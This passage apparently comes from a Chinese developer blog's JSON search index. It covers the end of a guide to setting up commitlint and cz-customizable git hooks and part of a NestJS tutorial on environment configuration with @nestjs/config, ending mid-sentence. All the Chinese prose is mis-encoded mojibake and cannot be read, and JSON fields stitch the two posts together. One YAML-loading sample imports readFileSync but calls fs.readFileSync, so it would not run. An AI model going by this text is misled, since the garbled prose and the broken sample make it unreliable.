æ­¤ï¼Œéœ€è¦ä¸€ä¸ªå·¥å…·æ¥å¸®åŠ©å¤§å®¶ç»Ÿä¸€commit messageçš„æ ¼å¼ï¼Œä¹Ÿæ–¹ä¾¿åç»­çš„åˆ†æå’Œæ‹“å±•ã€‚ cz-customizableæ˜¯ä¸€ä¸ªå¸®åŠ©ä¹¦å†™commit messageçš„å·¥å…·ï¼Œè€Œcommitlintæ˜¯ä¸€ä¸ªæ ¡éªŒcommit messageçš„å·¥å…·ã€‚ å®‰è£…commitlintå’Œcz-customizable: 1yarn add @commitlint/cli @commitlint/config-conventional cz-customizable -D æ·»åŠ commit-msgé’©å­ 1npx husky add .husky/commit-msg &quot;yarn commitlint --edit&quot; ç”Ÿæˆå¦‚ä¸‹æ–‡ä»¶ï¼š 1234#!/bin/sh. &quot;$(dirname &quot;$0&quot;)/_/husky.sh&quot;yarn commitlint --edit åœ¨package.jsonä¸­æ·»åŠ ä»¥ä¸‹é…ç½®ï¼š 123456789101112&#123; ... &quot;config&quot;: &#123; &quot;commitizen&quot;: &#123; &quot;path&quot;: &quot;./node_modules/cz-customizable&quot; &#125;, &quot;cz-customizable&quot;: &#123; &quot;config&quot;: &quot;./.cz-config.js&quot; &#125; &#125;, ...&#125; åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸­æ–°å»º.cz-config.jsæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051module.exports = &#123; types: [ &#123; value: &#x27;feat&#x27;, name: &#x27;feat: A new feature&#x27; &#125;, &#123; value: &#x27;fix&#x27;, name: &#x27;fix: A bug fix&#x27; &#125;, &#123; value: &#x27;style&#x27;, name: &#x27;style: Changes that do not affect the meaning of the code (white-space, formatting, missing semi-colons, etc)&#x27;, &#125;, &#123; value: &#x27;refactor&#x27;, name: &#x27;refactor: A code change that neither fixes a bug nor adds a feature&#x27;, &#125;, &#123; value: &#x27;revert&#x27;, name: &#x27;revert: Revert to a commit&#x27; &#125;, &#123; value: &#x27;chore&#x27;, name: &#x27;chore: Changes to the build process or auxiliary tools and libraries such as documentation generation&#x27;, &#125;, &#123; value: &#x27;docs&#x27;, name: &#x27;docs: Documentation only changes&#x27; &#125;, &#123; value: &#x27;perf&#x27;, name: &#x27;perf: A code change that improves performance&#x27;, &#125;, &#123; value: &#x27;test&#x27;, name: &#x27;test: Adding missing tests&#x27; &#125;, ], scopes: [ &#123; name: &#x27;frontend&#x27; &#125;, &#123; name: &#x27;backend&#x27; &#125;, &#123; name: &#x27;service&#x27; &#125;, ], messages: &#123; type: &quot;Select the type of change that you&#x27;re committing:&quot;, scope: &quot; Select the scope of change that you&#x27;re committing:&quot;, // used if allowCustomScopes is true customScope: &#x27;Denote the custom scope:&#x27;, subject: &#x27;Write a SHORT, IMPERATIVE tense description of the change: &#x27;, body: &#x27;Provide a LONGER description of the change (optional). Use &quot;|&quot; to break new line: &#x27;, breaking: &#x27;List any BREAKING CHANGES (optional): &#x27;, footer: &#x27;List any ISSUES CLOSED by this change (optional). E.g.: #31, #34: &#x27;, confirmCommit: &#x27;Are you sure you want to proceed with the commit above?&#x27;, &#125;, allowCustomScopes: true,&#125; åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸­æ–°å»º.commitlintrc.jsæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š 1234567891011const typeEnum = require(&#x27;./.cz-config&#x27;);module.exports = &#123; extends: [&#x27;@commitlint/config-conventional&#x27;], rules: &#123; &#x27;type-enum&#x27;: [2, &#x27;always&#x27;, typeEnum.types.map((i) =&gt; i.value)], &#x27;scope-enum&#x27;: [2, &#x27;always&#x27;, typeEnum.scopes.map((i) =&gt; i.name)], &#x27;scope-empty&#x27;: [2, &#x27;never&#x27;], &#125;,&#125;; é…ç½®å®Œæˆåï¼Œæ¯æ¬¡æäº¤commitæ—¶ï¼Œå¯ä»¥ä½¿ç”¨git czæ›¿æ¢git commitå‘½ä»¤ï¼Œä»è€Œè¾…åŠ©æˆ‘ä»¬æ›´åŠ è§„èŒƒçš„ä¹¦å†™commit messageã€‚ æ›´å¤šè¯¦ç»†é…ç½®ï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼šhttps://juejin.cn/post/6844903831893966856 æ€»ç»“ä»¥ä¸Šå°±æ˜¯æˆ‘å¯¹å¦‚ä½•åœ¨lernaé¡¹ç›®ä¸­é…ç½®huskyã€lint-stagedå’ŒCzå·¥å…·çš„ä¸€äº›ç²—ç•¥è®¤çŸ¥ï¼Œå½“ç„¶ä¸ä»…ä»…æ˜¯lernaé¡¹ç›®ï¼Œä¹Ÿé€‚ç”¨äºä»»ä½•å‰ç«¯é¡¹ç›®ã€‚ é“¾æ¥ huskyå®˜æ–‡æ–‡æ¡£ lint-stagedå®˜æ–¹æ–‡æ¡£ Czå·¥å…·é›†ä½¿ç”¨ä»‹ç»"},{"title":"NestJS - é…ç½®","path":"/2021/03/17/1255498d9728/","content":"åº”ç”¨ç¨‹åºé€šå¸¸è¿è¡Œåœ¨ä¸åŒçš„ç¯å¢ƒï¼Œä¾‹å¦‚ï¼Œå¼€å‘æœ‰å¼€å‘ç¯å¢ƒã€æµ‹è¯•ç¯å¢ƒï¼Œçº¿ä¸Šæœ‰é¢„å‘å¸ƒç¯å¢ƒã€ç”Ÿäº§ç¯å¢ƒï¼Œè€Œè¿è¡Œåœ¨ä¸åŒçš„ç¯å¢ƒï¼Œéœ€è¦æœ‰ä¸åŒçš„é…ç½®ï¼Œä¾‹å¦‚æ•°æ®åº“çš„é…ç½®ç­‰ã€‚ åœ¨Nodeä¸­ï¼Œå¤–éƒ¨å®šä¹‰çš„ç¯å¢ƒå˜é‡é€šè¿‡procress.envå…¨å±€å¯è§ã€‚åœ¨Node.jsåº”ç”¨ç¨‹åºä¸­ï¼Œé€šå¸¸ä½¿ç”¨.envæ–‡ä»¶æ¥é…ç½®è¿™äº›ç¯å¢ƒå˜é‡ï¼Œå…¶ä¸­æ¯ä¸ªé”®ä»£è¡¨ä¸€ä¸ªç‰¹å®šçš„å€¼ï¼Œä»¥ä»£è¡¨æ¯ä¸ªç¯å¢ƒã€‚ è§£æ.envæ–‡ä»¶å¹¶åŠ è½½åˆ°procress.envä¸­ï¼Œå°±éœ€è¦ä½¿ç”¨dotenvè¿™ä¸ªåŒ…äº†ï¼Œä½†æ˜¯Nestæä¾›äº†ä¸€ä¸ªé…ç½®ç¯å¢ƒå˜é‡çš„è½¯ä»¶åŒ… - @nestjs/configï¼Œå…¶å†…éƒ¨ä¾èµ–äº†dotenvã€‚ å®‰è£…@nestjs/config12345// npm$ npm i --save @nestjs/config// yarn$ yarn add @nestjs/config ç®€å•ä½¿ç”¨å®‰è£…å®Œæˆåï¼Œæˆ‘ä»¬å¯ä»¥å¯¼å…¥ConfigModuleã€‚é€šå¸¸ï¼Œæˆ‘ä»¬å°†å…¶å¯¼å…¥æ ¹ç›®å½•AppModuleå¹¶ä½¿ç”¨. forRoot()é™æ€æ–¹æ³•æ§åˆ¶å…¶è¡Œä¸ºã€‚åœ¨æ­¤æ­¥éª¤ä¸­ï¼Œå°†è§£æå¹¶ç”Ÿæˆç¯å¢ƒå˜é‡é”®&#x2F;å€¼å¯¹ã€‚ç¨åï¼Œæˆ‘ä»¬å°†åœ¨å…¶ä»–åŠŸèƒ½æ¨¡å—ä¸­çœ‹åˆ°ä¸€äº›ç”¨äºè®¿é—®çš„ConfigServiceç±»çš„é€‰é¡¹ConfigModuleã€‚ 1234567import &#123; Module &#125; from &#x27;@nestjs/common&#x27;;import &#123; ConfigModule &#125; from &#x27;@nestjs/config&#x27;;@Module(&#123; imports: [ConfigModule.forRoot()],&#125;)export class AppModule &#123;&#125; ä¸Šé¢çš„ä»£ç å°†ä».envé»˜è®¤ä½ç½®ï¼ˆé¡¹ç›®æ ¹ç›®å½•ï¼‰åŠ è½½å¹¶è§£ææ–‡ä»¶ï¼Œå°†æ–‡ä»¶ä¸­çš„é”®&#x2F;å€¼å¯¹.envä¸åˆ†é…ç»™å…¶çš„ç¯å¢ƒå˜é‡åˆå¹¶process.envï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨ç§æœ‰ç»“æ„ä¸­ï¼Œæ‚¨å¯ä»¥é€šè¿‡è®¿é—®è¯¥ç§æœ‰ç»“æ„ConfigServiceã€‚è¯¥forRoot()æ–¹æ³•æ³¨å†Œäº†ConfigServiceæä¾›ç¨‹åºï¼Œè¯¥æä¾›ç¨‹åºæä¾›äº†get()ä¸€ç§è¯»å–è¿™äº›å·²è§£æ&#x2F;åˆå¹¶çš„é…ç½®å˜é‡çš„æ–¹æ³•ã€‚ç”±äº@nestjs/configä¾èµ–äºdotenvï¼Œå› æ­¤å®ƒä½¿ç”¨è¯¥ç¨‹åºåŒ…çš„è§„åˆ™æ¥è§£å†³ç¯å¢ƒå˜é‡åç§°ä¸­çš„å†²çªã€‚å½“å¯†é’¥åœ¨è¿è¡Œæ—¶ç¯å¢ƒä¸­ä½œä¸ºç¯å¢ƒå˜é‡ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡OS shellå¯¼å‡ºä¹‹ç±»export DATABASE_USER&#x3D;testï¼‰å’Œåœ¨.envæ–‡ä»¶ä¸­åŒæ—¶å­˜åœ¨æ—¶ï¼Œè¿è¡Œæ—¶ç¯å¢ƒå˜é‡ä¼˜å…ˆã€‚ ç¤ºä¾‹.envæ–‡ä»¶å¦‚ä¸‹æ‰€ç¤ºï¼š 12DATABASE_USER=testDATABASE_PASSWORD=test è‡ªå®šä¹‰ENVæ–‡ä»¶è·¯å¾„é»˜è®¤æƒ…å†µä¸‹ï¼Œç¨‹åºä¼šåœ¨åº”ç”¨ç¨‹åºçš„æ ¹ç›®å½•ä¸­æŸ¥æ‰¾.envæ–‡ä»¶ã€‚è¦ä¸º.envæ–‡ä»¶æŒ‡å®šå…¶ä»–è·¯å¾„ï¼Œè¯·è®¾ç½®forRoot()çš„å¯é€‰å±æ€§envFilePathï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 123ConfigModule.forRoot(&#123; envFilePath: &#x27;.development.env&#x27;,&#125;); æ‚¨è¿˜å¯ä»¥ä¸º.envæ–‡ä»¶æŒ‡å®šå¤šä¸ªè·¯å¾„ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 123ConfigModule.forRoot(&#123; envFilePath: [&#x27;.env.development.local&#x27;, &#x27;.env.development&#x27;],&#125;); å¦‚æœåœ¨å¤šä¸ªæ–‡ä»¶ä¸­æ‰¾åˆ°ä¸€ä¸ªå˜é‡ï¼Œåˆ™ç¬¬ä¸€ä¸ªä¼˜å…ˆã€‚ åœ¨å®é™…å¼€å‘ä¸­ï¼Œå¾€å¾€æœ‰å¤šä¸ªé…ç½®æ–‡ä»¶ï¼Œæ¯”å¦‚å¼€å‘ç¯å¢ƒä½¿ç”¨.development.envé…ç½®æ–‡ä»¶ï¼Œæµ‹è¯•ç¯å¢ƒä½¿ç”¨.test.envé…ç½®æ–‡ä»¶ï¼Œç”Ÿäº§ç¯å¢ƒä½¿ç”¨.production.envé…ç½®æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨ä¸åŒçš„å¯åŠ¨å‘½ä»¤ï¼Œå¯ç”¨ä¸åŒçš„é…ç½®æ–‡ä»¶ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š 1234567891011// package.json&#123; ... &quot;scripts&quot;: &#123; &quot;start&quot;: &quot;cross-env NODE_ENV=development nest start&quot;, &quot;start:dev&quot;: &quot;cross-env NODE_ENV=development nest start --watch&quot;, &quot;start:prod&quot;: &quot;cross-env NODE_ENV=production node dist/main&quot;, &quot;test&quot;: &quot;cross-env NODE_ENV=test jest&quot;, &#125;, ...&#125; å®‰è£…cross-envï¼Œä½¿ç”¨å®ƒè·¨å¹³å°çš„è®¾ç½®ç¯å¢ƒå˜é‡ 123ConfigModule.forRoot(&#123; envFilePath: `$&#123;process.env.NODE_ENV || &#x27;development&#x27;&#125;.env`,&#125;); ä½¿ç”¨å…¨å±€moduleå¦‚æœè¦ConfigModuleåœ¨å…¶ä»–æ¨¡å—ä¸­ä½¿ç”¨ï¼Œåˆ™éœ€è¦å°†å…¶å¯¼å…¥ï¼ˆè¿™æ˜¯æ‰€æœ‰Nestæ¨¡å—çš„æ ‡å‡†é…ç½®ï¼‰ã€‚æˆ–è€…ï¼Œé€šè¿‡å°†optionså¯¹è±¡çš„isGlobalå±æ€§è®¾ç½®ä¸ºtrueï¼Œå°†å…¶å£°æ˜ä¸ºå…¨å±€æ¨¡å—ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸€æ—¦ConfigModuleè¢«åŠ è½½åˆ°æ ¹æ¨¡å—ä¸­ï¼Œå°±ä¸éœ€è¦åœ¨å…¶ä»–æ¨¡å—ä¸­å¯¼å…¥ConfigModuleäº† 123ConfigModule.forRoot(&#123; isGlobal: true,&#125;); è‡ªå®šä¹‰é…ç½®æ–‡ä»¶å¯¹äºæ›´å¤æ‚çš„é¡¹ç›®ï¼Œå¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰é…ç½®æ–‡ä»¶è¿”å›åµŒå¥—çš„é…ç½®å¯¹è±¡ã€‚è¿™å…è®¸æ‚¨æŒ‰åŠŸèƒ½å¯¹ç›¸å…³é…ç½®è®¾ç½®è¿›è¡Œåˆ†ç»„ï¼ˆä¾‹å¦‚ï¼Œä¸æ•°æ®åº“ç›¸å…³çš„è®¾ç½®ï¼‰ï¼Œå¹¶å°†ç›¸å…³è®¾ç½®å­˜å‚¨åœ¨å•ä¸ªæ–‡ä»¶ä¸­ï¼Œä»¥å¸®åŠ©ç‹¬ç«‹ç®¡ç†å®ƒä»¬ã€‚ è‡ªå®šä¹‰é…ç½®æ–‡ä»¶å¯¼å‡ºä¸€ä¸ªå·¥å‚å‡½æ•°ï¼Œè¯¥å‡½æ•°è¿”å›ä¸€ä¸ªé…ç½®å¯¹è±¡ã€‚é…ç½®å¯¹è±¡å¯ä»¥æ˜¯ä»»ä½•ä»»æ„åµŒå¥—çš„æ™®é€šJavaScriptå¯¹è±¡ã€‚process.envå¯¹è±¡å°†åŒ…å«å®Œå…¨è§£æçš„ç¯å¢ƒå˜é‡key-valueå¯¹ï¼ˆå¦‚ä¸Šæ‰€è¿°ï¼Œ.envæ–‡ä»¶å’Œå¤–éƒ¨å®šä¹‰çš„å˜é‡è¢«è§£æå’Œåˆå¹¶ï¼‰ã€‚ç”±äºä½ æ§åˆ¶äº†è¿”å›çš„é…ç½®å¯¹è±¡ï¼Œä½ å¯ä»¥æ·»åŠ ä»»ä½•æ‰€éœ€çš„é€»è¾‘æ¥å°†å€¼æŠ•å°„åˆ°ä¸€ä¸ªé€‚å½“çš„ç±»å‹ï¼Œè®¾ç½®é»˜è®¤å€¼ç­‰ã€‚ä¾‹å¦‚ 1234567export default () =&gt; (&#123; port: parseInt(process.env.PORT, 10) || 3000, database: &#123; host: process.env.DATABASE_HOST, port: parseInt(process.env.DATABASE_PORT, 10) || 5432 &#125;&#125;); å°†å…¶ä¼ ç»™ConfigModule.forRoot()çš„loadå±æ€§ï¼Œæ¥åŠ è½½è¿™ä¸ªè‡ªå®šä¹‰é…ç½®ï¼š 12345678910import configuration from &#x27;./config/configuration&#x27;;@Module(&#123; imports: [ ConfigModule.forRoot(&#123; load: [configuration], &#125;), ],&#125;)export class AppModule &#123;&#125; loadå±æ€§æ˜¯ä¸ªæ•°ç»„ï¼Œå…è®¸åŠ è½½å¤šä¸ªè‡ªå®šä¹‰é…ç½®æ–‡ä»¶ é€šè¿‡è‡ªå®šä¹‰é…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ç®¡ç†è‡ªå®šä¹‰æ–‡ä»¶ï¼Œå¦‚YAMLæ–‡ä»¶ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨YAMLæ ¼å¼çš„é…ç½®çš„ä¾‹å­ã€‚ 123456789101112http: host: &#x27;localhost&#x27; port: 8080db: postgres: url: &#x27;localhost&#x27; port: 5432 database: &#x27;yaml-db&#x27; sqlite: database: &#x27;sqlite.db&#x27; ä¸ºäº†è¯»å–å’Œè§£æYAMLæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨js-yamlåŒ…ã€‚ 12$ npm i js-yaml$ npm i -D @types/js-yaml å®‰è£…è½¯ä»¶åŒ…åï¼Œæˆ‘ä»¬å°†ä½¿ç”¨yaml#loadå‡½æ•°æ¥åŠ è½½åˆšåˆšåœ¨ä¸Šé¢åˆ›å»ºçš„YAMLæ–‡ä»¶ã€‚ 1234567891011import &#123; readFileSync &#125; from &#x27;fs&#x27;;import * as yaml from &#x27;js-yaml&#x27;;import &#123; join &#125; from &#x27;path&#x27;;const YAML_CONFIG_FILENAME = &#x27;config.yml&#x27;;export default () =&gt; &#123; return yaml.load( fs.readFileSync(join(__dirname, YAML_CONFIG_FILENAME), &#x27;utf8&#x27;), );&#125;; ä½¿ç”¨ConfigServiceè¦ä»ConfigServiceä¸­è®¿é—®é…ç½®å€¼ï¼Œæˆ‘ä»¬é¦–å…ˆå¾—æ³¨å…¥ConfigServiceï¼Œå’Œä½¿ç”¨å…¶ä»–providerä¸€æ ·ï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶åŠ å…¥@Moduleçš„importså±æ€§ä¸­ï¼ˆå¦‚æœå°†ConfigModuleé…ç½®æˆå…¨å±€moduleï¼Œåˆ™å¯ä»¥å¿½ç•¥è¿™ä¸€æ­¥ï¼‰ 1234@Module(&#123; imports: [ConfigModule], // ...&#125;) ç„¶åæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ ‡å‡†çš„æ„é€ å‡½æ•°æ³¨å…¥: 123// import &#123; ConfigService &#125; from &#x27;@nestjs/config&#x27;;constructor(private configService: ConfigService) &#123;&#125; è·å– 12345// get an environment variableconst dbUser = this.configService.get&lt;string&gt;(&#x27;DATABASE_USER&#x27;);// get a custom configuration valueconst dbHost = this.configService.get&lt;string&gt;(&#x27;database.host&#x27;); å¦‚ä¸Šæ‰€ç¤ºï¼Œä½¿ç”¨configService.get()æ–¹æ³•é€šè¿‡ä¼ é€’å˜é‡åæ¥è·å–ä¸€ä¸ªç®€å•çš„ç¯å¢ƒå˜é‡ã€‚ä½ å¯ä»¥é€šè¿‡ä¼ é€’ç±»å‹æ¥åšTypeScriptç±»å‹æç¤ºï¼Œå¦‚ä¸Šæ‰€ç¤º(ä¾‹å¦‚ï¼Œget&lt;string&gt;(â€¦))ã€‚get()æ–¹æ³•ä¹Ÿå¯ä»¥éå†ä¸€ä¸ªåµŒå¥—çš„è‡ªå®šä¹‰é…ç½®å¯¹è±¡ï¼ˆé€šè¿‡è‡ªå®šä¹‰é…ç½®æ–‡ä»¶åˆ›å»ºï¼‰ï¼Œå¦‚ä¸Šé¢ç¬¬äºŒä¸ªä¾‹å­æ‰€ç¤ºã€‚ ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€ä¸ªæ¥å£ä½œä¸ºç±»å‹æç¤ºæ¥è·å¾—æ•´ä¸ªåµŒå¥—çš„è‡ªå®šä¹‰é…ç½®å¯¹è±¡ã€‚ 123456789interface DatabaseConfig &#123; host: string; port: number;&#125;const dbConfig = this.configService.get&lt;DatabaseConfig&gt;(&#x27;database&#x27;);// you can now use `dbConfig.port` and `dbConfig.host`const port = dbConfig.port; get()æ–¹æ³•è¿˜éœ€è¦ä¸€ä¸ªå¯é€‰çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œå®šä¹‰ä¸€ä¸ªé»˜è®¤å€¼ï¼Œå½“é”®ä¸å­˜åœ¨æ—¶ï¼Œå°†è¿”å›é»˜è®¤å€¼ï¼Œå¦‚ä¸‹æ‰€ç¤º: 12// use &quot;localhost&quot; when &quot;database.host&quot; is not definedconst dbHost = this.configService.get&lt;string&gt;(&#x27;database.host&#x27;, &#x27;localhost&#x27;); ConfigServiceæœ‰ä¸€ä¸ªå¯é€‰çš„æ³›å‹(ç±»å‹å‚æ•°)æ¥å¸®åŠ©é˜²æ­¢è®¿é—®ä¸å­˜åœ¨çš„é…ç½®å±æ€§ã€‚ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹: 12345678910111213interface EnvironmentVariables &#123; PORT: number; TIMEOUT: string;&#125;// somewhere in the codeconstructor(private configService: ConfigService&lt;EnvironmentVariables&gt;) &#123; // this is valid const port = this.configService.get&lt;number&gt;(&#x27;PORT&#x27;); // this is invalid as URL is not a property on the EnvironmentVariables interface const url = this.configService.get&lt;string&gt;(&#x27;URL&#x27;);&#125; é…ç½®å‘½åç©ºé—´ConfigModuleå…è®¸æ‚¨å®šä¹‰å’ŒåŠ è½½å¤šä¸ªè‡ªå®šä¹‰é…ç½®æ–‡ä»¶ï¼Œå¦‚ä¸Šé¢çš„è‡ªå®šä¹‰é…ç½®æ–‡ä»¶æ‰€ç¤ºã€‚æ‚¨å¯ä»¥ä½¿ç”¨åµŒå¥—çš„é…ç½®å¯¹è±¡ç®¡ç†å¤æ‚çš„é…ç½®å¯¹è±¡å±‚æ¬¡ï¼Œå¦‚è¯¥èŠ‚æ‰€ç¤ºã€‚å¦å¤–ï¼Œæ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨ registerAs()å‡½æ•°è¿”å›ä¸€ä¸ª â€œnamespaced â€œçš„é…ç½®å¯¹è±¡ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ 123456import &#123; registerAs &#125; from &#x27;@nestjs/config&#x27;; export default registerAs(&#x27;database&#x27;, () =&gt; (&#123; host: process.env.DATABASE_HOST, port: process.env.DATABASE_PORT || 5432&#125;)); ç”¨forRoot()æ–¹æ³•çš„å‚æ•°å¯¹è±¡çš„loadå±æ€§åŠ è½½ä¸€ä¸ªå‘½åç©ºé—´çš„é…ç½®ï¼Œä¸åŠ è½½è‡ªå®šä¹‰é…ç½®æ–‡ä»¶çš„æ–¹å¼ç›¸åŒã€‚ 12345678910import databaseConfig from &#x27;./config/database.config&#x27;;@Module(&#123; imports: [ ConfigModule.forRoot(&#123; load: [databaseConfig], &#125;), ],&#125;)export class AppModule &#123;&#125; ç°åœ¨ï¼Œè¦ä»databaseå‘½åç©ºé—´ä¸­è·å–hostï¼Œä½¿ç”¨ç‚¹æ“ä½œç¬¦ã€‚ä½¿ç”¨databaseä½œä¸ºå±æ€§åçš„å‰ç¼€ï¼Œå¯¹åº”äºå‘½åç©ºé—´çš„åç§°ï¼ˆä½œä¸º registerAs() å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¼ é€’ï¼‰ã€‚ 1const dbHost = this.configService.get&lt;string&gt;(&#x27;database.host&#x27;); ä¸€ä¸ªåˆç†çš„é€‰æ‹©æ˜¯ç›´æ¥æ³¨å…¥databaseå‘½åç©ºé—´ã€‚è¿™ä½¿æˆ‘ä»¬èƒ½å¤Ÿä»å¼ºç±»å‹åŒ–ä¸­è·ç›Šã€‚ 123456// import &#123; ConfigType &#125; from &#x27;@nestjs/config&#x27;;constructor( @Inject(databaseConfig.KEY) private dbConfig: ConfigType&lt;typeof databaseConfig&gt;,) &#123;&#125; ç¼“å­˜ç¯å¢ƒå˜é‡ç”±äºè®¿é—®process.envä¼šå¾ˆæ…¢ï¼Œä½ å¯ä»¥è®¾ç½®ä¼ é€’ç»™ConfigModule.forRoot()çš„optionså¯¹è±¡çš„cacheå±æ€§ï¼Œä»¥æé«˜ConfigServiceçš„æ€§èƒ½ã€‚ 123ConfigModule.forRoot(&#123; cache: true,&#125;); éƒ¨åˆ†æ³¨å†Œåˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬å·²ç»ç”¨forRoot()æ–¹æ³•å¤„ç†äº†æ ¹æ¨¡å—(å¦‚AppModule)ä¸­çš„é…ç½®æ–‡ä»¶ã€‚ä¹Ÿè®¸ä½ æœ‰ä¸€ä¸ªæ›´å¤æ‚çš„é¡¹ç›®ç»“æ„ï¼Œç‰¹å®šåŠŸèƒ½çš„é…ç½®æ–‡ä»¶ä½äºå¤šä¸ªä¸åŒçš„ç›®å½•ä¸­ã€‚@nestjs/configåŒ…æä¾›äº†ä¸€ä¸ªå«åšéƒ¨åˆ†æ³¨å†Œçš„åŠŸèƒ½ï¼Œå®ƒåªå¼•ç”¨ä¸æ¯ä¸ªåŠŸèƒ½æ¨¡å—ç›¸å…³è”çš„é…ç½®æ–‡ä»¶ï¼Œè€Œä¸æ˜¯åœ¨æ ¹æ¨¡å—ä¸­åŠ è½½æ‰€æœ‰è¿™äº›æ–‡ä»¶ã€‚åœ¨ç‰¹æ€§æ¨¡å—ä¸­ä½¿ç”¨forFeature()é™æ€æ–¹æ³•æ¥æ‰§è¡Œè¿™ä¸ªéƒ¨åˆ†æ³¨å†Œï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ 123456import databaseConfig from &#x27;./config/database.config&#x27;;@Module(&#123; imports: [ConfigModule.forFeature(databaseConfig)],&#125;)export class DatabaseModule &#123;&#125; æ ¡éªŒç¯å¢ƒå˜é‡å¦‚æœæ‰€éœ€çš„ç¯å¢ƒå˜é‡æ²¡æœ‰è¢«æä¾›æˆ–ä¸ç¬¦åˆæŸäº›éªŒè¯è§„åˆ™ï¼Œåœ¨åº”ç”¨ç¨‹åºå¯åŠ¨æ—¶æŠ›å‡ºå¼‚å¸¸æ˜¯æ ‡å‡†åšæ³•ã€‚@nestjsconfigåŒ…æœ‰ä¸¤ç§ä¸åŒçš„æ–¹å¼æ¥å®ç°è¿™ä¸€ç‚¹ã€‚ Joiå†…ç½®éªŒè¯å™¨ã€‚ä½¿ç”¨Joiï¼Œä½ å¯ä»¥å®šä¹‰ä¸€ä¸ªå¯¹è±¡æ¨¡å¼ï¼Œå¹¶å¯¹å…¶è¿›è¡ŒJavaScriptå¯¹è±¡éªŒè¯ã€‚ ä¸€ä¸ªè‡ªå®šä¹‰çš„validate()å‡½æ•°ï¼Œå®ƒæ¥å—ç¯å¢ƒå˜é‡ä½œä¸ºè¾“å…¥ã€‚ è¦ä½¿ç”¨Joiï¼Œæˆ‘ä»¬å¿…é¡»å®‰è£…JoiåŒ…: 1$ yarn add joi æœ€æ–°ç‰ˆæœ¬çš„joiéœ€è¦ä½ è¿è¡ŒNode v12æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚æ—§ç‰ˆæœ¬çš„nodeè¯·å®‰è£…v16.1.8ã€‚è¿™ä¸»è¦æ˜¯åœ¨v17.0.2å‘å¸ƒåï¼Œåœ¨æ„å»ºçš„æ—¶å€™ä¼šå‡ºç°é”™è¯¯ã€‚æ›´å¤šä¿¡æ¯è¯·å‚è€ƒå…¶17.0.0å‘å¸ƒè¯´æ˜(https://github.com/sideway/joi/issues/2262)ã€‚ ç°åœ¨æˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸€ä¸ªJoiéªŒè¯æ¨¡å¼ï¼Œå¹¶é€šè¿‡forRoot()æ–¹æ³•çš„é€‰é¡¹å¯¹è±¡çš„validationSchemaå±æ€§ä¼ é€’ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ 123456789101112131415import * as Joi from &#x27;joi&#x27;;@Module(&#123; imports: [ ConfigModule.forRoot(&#123; validationSchema: Joi.object(&#123; NODE_ENV: Joi.string() .valid(&#x27;development&#x27;, &#x27;production&#x27;, &#x27;test&#x27;, &#x27;provision&#x27;) .default(&#x27;development&#x27;), PORT: Joi.number().default(3000), &#125;), &#125;), ],&#125;)export class AppModule &#123;&#125; é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰çš„ schema keys éƒ½è¢«è®¤ä¸ºæ˜¯å¯é€‰çš„ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬ä¸º NODE_ENVå’ŒPORTè®¾ç½®äº†é»˜è®¤å€¼ï¼Œå¦‚æœæˆ‘ä»¬ä¸åœ¨ç¯å¢ƒ(.envæ–‡ä»¶æˆ–è¿›ç¨‹ç¯å¢ƒ)ä¸­æä¾›è¿™äº›å˜é‡ï¼Œå°±ä¼šä½¿ç”¨è¿™äº›å˜é‡ã€‚å¦å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ required() éªŒè¯æ–¹æ³•æ¥è¦æ±‚å¿…é¡»åœ¨ç¯å¢ƒ (.env æ–‡ä»¶æˆ–è¿›ç¨‹ç¯å¢ƒ) ä¸­å®šä¹‰ä¸€ä¸ªå€¼ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœæˆ‘ä»¬æ²¡æœ‰åœ¨ç¯å¢ƒä¸­æä¾›å˜é‡ï¼ŒéªŒè¯æ­¥éª¤å°†æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ã€‚å…³äºå¦‚ä½•æ„é€ éªŒè¯æ¨¡å¼ï¼Œè¯·å‚è§JoiéªŒè¯æ–¹æ³•ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œå…è®¸æœªçŸ¥çš„ç¯å¢ƒå˜é‡ï¼ˆæ¨¡å¼ä¸­é”®ä¸å­˜åœ¨çš„ç¯å¢ƒå˜é‡ï¼‰ï¼Œå¹¶ä¸”ä¸ä¼šè§¦å‘éªŒè¯å¼‚å¸¸ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰çš„éªŒè¯é”™è¯¯éƒ½ä¼šè¢«æŠ¥å‘Šã€‚ä½ 